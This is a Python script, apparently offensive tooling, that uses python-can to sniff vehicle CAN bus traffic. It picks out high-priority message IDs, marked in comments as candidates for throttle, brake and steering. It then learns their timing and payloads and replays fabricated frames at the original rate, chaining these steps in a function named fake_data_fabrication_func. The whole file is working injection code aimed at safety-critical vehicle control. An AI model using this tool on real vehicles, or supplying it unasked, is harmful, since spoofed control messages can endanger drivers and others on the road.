from collections import defaultdict
from statistics import median
import time
import can

def identify_signals(bus, observe_time=10.0):
    """
    Observe traffic and flag IDs whose payload bytes change
    meaningfully — candidates for throttle/brake/steering.
    """
    stats = defaultdict(lambda: {
        "count": 0,
        "last_ts": None,
        "periods": [],
        "byte_min": [255] * 8,
        "byte_max": [0] * 8,
        "byte_changes": [0] * 8,
        "last_bytes": None,
    })

    start = time.time()
    while time.time() - start < observe_time:
        msg = bus.recv(timeout=0.5)
        if msg is None or msg.is_error_frame:
            continue

        cid = msg.arbitration_id
        ts = msg.timestamp
        data = bytes(msg.data)
        s = stats[cid]
        s["count"] += 1

        if s["last_ts"] is not None:
            s["periods"].append(ts - s["last_ts"])
        s["last_ts"] = ts

        if s["last_bytes"] is not None:
            for i, b in enumerate(data):
                if b != s["last_bytes"][i]:
                    s["byte_changes"][i] += 1
                s["byte_min"][i] = min(s["byte_min"][i], b)
                s["byte_max"][i] = max(s["byte_max"][i], b)
        s["last_bytes"] = data

    print(f"{'ID':>8} {'count':>7} {'period(ms)':>11} {'changing bytes (range)'}")
    for cid, s in sorted(stats.items(), key=lambda x: -x[1]["count"]):
        if not s["periods"]:
            continue
        p = median(s["periods"]) * 1000
        changing = []
        for i in range(8):
            if s["byte_max"][i] > s["byte_min"][i]:
                changing.append(
                    f"b{i}:{s['byte_min'][i]:02X}-{s['byte_max'][i]:02X}"
                    f"({s['byte_changes'][i]})"
                )
        print(f"0x{cid:06X} {s['count']:7d} {p:11.2f} {' '.join(changing)}")

def identify_priority_packets(
    bus,
    observe_time=5.0,
    max_dlc=8,               # set to 4 if you want to be strict
    min_frequency_hz=8.0,
    top_n=10,
):
    """
    Return a ranked shortlist of CAN IDs that are small, fast, high-priority.
    """
    stats = defaultdict(lambda: {
        "count": 0, "last_ts": None, "periods": [], "dlc": None,
    })

    start = time.time()
    while time.time() - start < observe_time:
        msg = bus.recv(timeout=0.5)
        if msg is None or msg.is_error_frame or msg.is_remote_frame:
            continue
        cid = msg.arbitration_id
        s = stats[cid]
        s["count"] += 1
        s["dlc"] = msg.dlc
        if s["last_ts"] is not None:
            s["periods"].append(msg.timestamp - s["last_ts"])
        s["last_ts"] = msg.timestamp

    candidates = {}
    for cid, s in stats.items():
        if s["dlc"] is None or s["dlc"] > max_dlc:      # size filter
            continue
        if len(s["periods"]) < 3:
            continue
        period = median(s["periods"])
        if period <= 0:
            continue
        freq = 1.0 / period
        if freq < min_frequency_hz:                     # frequency filter
            continue
        candidates[cid] = {
            "can_id": cid, "dlc": s["dlc"], "count": s["count"],
            "period": period, "frequency": freq,
        }

    if not candidates:
        print("No candidates matched size/frequency filters.")
        return []

    max_count = max(c["count"] for c in candidates.values())
    results = []
    for cid, c in candidates.items():
        dlc_score  = (8 - c["dlc"]) / 8.0               # smaller = better
        freq_score = c["count"] / max_count             # faster = better
        prio_score = 1.0 - (cid / 0x7FF)                # lower ID = better
        score = 0.3 * dlc_score + 0.4 * freq_score + 0.3 * prio_score
        c["score"] = score
        results.append(c)

    results.sort(key=lambda x: x["score"], reverse=True)
    top = results[:top_n]

    print(f"\nTop {len(top)} candidate IDs "
          f"(DLC<={max_dlc}, freq>={min_frequency_hz}Hz):")
    print(f"{'ID':>8} {'DLC':>4} {'count':>7} "
          f"{'period(ms)':>11} {'freq(Hz)':>9} {'score':>6}")
    for r in top:
        print(f"0x{r['can_id']:05X} {r['dlc']:4d} {r['count']:7d} "
              f"{r['period']*1000:11.2f} {r['frequency']:9.1f} "
              f"{r['score']:6.3f}")

    return [r["can_id"] for r in top]

def learn_targets(bus, target_ids, observe_time=5.0):
    """
    Learn median period + a representative payload for each target ID.
    Returns {can_id: {'period': float_seconds, 'payload': bytes}}
    """
    periods = defaultdict(list)
    last_payload = {}
    last_ts = {}

    start = time.time()
    while time.time() - start < observe_time:
        msg = bus.recv(timeout=0.5)
        if msg is None or msg.arbitration_id not in target_ids:
            continue
        cid = msg.arbitration_id
        if cid in last_ts:
            periods[cid].append(msg.timestamp - last_ts[cid])
        last_ts[cid] = msg.timestamp
        last_payload[cid] = bytes(msg.data)

    result = {}
    for cid, ps in periods.items():
        if len(ps) >= 3:
            result[cid] = {
                "period": median(ps),
                "payload": last_payload[cid],
            }
            print(f"0x{cid:X}: median period = {median(ps)*1000:.2f} ms "
                  f"({1/median(ps):.1f} Hz), "
                  f"payload = {last_payload[cid].hex(' ').upper()}")
    return result

def replay_periodic(bus, targets):
    """
    targets: {can_id: {'period': sec, 'payload': bytes}}
    """
    tasks = []
    for cid, info in targets.items():
        msg = can.Message(
            arbitration_id=cid,
            data=info["payload"],
            is_extended_id=False,
        )
        task = bus.send_periodic(msg, info["period"])
        tasks.append((cid, task))
        print(f"Replaying 0x{cid:X} every {info['period']*1000:.2f} ms")

    try:
        input("Press Enter to stop replay...\n")
    finally:
        for cid, task in tasks:
            task.stop()
        print("Replay stopped.")

####################################################################

def fake_data_fabrication_func(bus):
    print("=== Step 1: Auto-identify target IDs ===")
    target_ids = identify_priority_packets(
        bus,
        observe_time=5.0,
        max_dlc=4,
        min_frequency_hz=8.0,
        top_n=10,
    )
    if not target_ids:
        print("No targets identified — aborting.")
        bus.shutdown()
        return

    print(f"\nSelected IDs: {[hex(i) for i in target_ids]}")

    print("\n=== Step 2: Learn periods & payloads ===")
    targets = learn_targets(bus, set(target_ids), observe_time=5.0)
    if not targets:
        print("No target IDs observed during learning — aborting.")
        bus.shutdown()
        return

    # Ajuste Técnico
    try:
        targets.pop(int("611", 16))
        targets.pop(int("612", 16))
        targets.pop(int("613", 16))
    except Exception:
        print("Ajuste técnico não funcinou 100%")

    print("\n=== Step 3: Replay at original frequency ===")
    replay_periodic(bus, targets)

    bus.shutdown()

'''
def fake_data_fabrication_func(bus):
    print("=== Step 1: Identify target IDs ===")
    target_ids = {
        0x600,   # ← replace with throttle ID you found
        0x601,   # ← brake
        0x602,   # ← steering
    }

    identify_signals(bus, 5)

    print("=== Step 2: Learn periods & payloads ===")
    targets = learn_targets(bus, target_ids, observe_time=5.0)
    if not targets:
        print("No target IDs observed — check your ID list.")
        return

    print("=== Step 3: Replay at original frequency ===")
    replay_periodic(bus, targets)

    bus.shutdown()
'''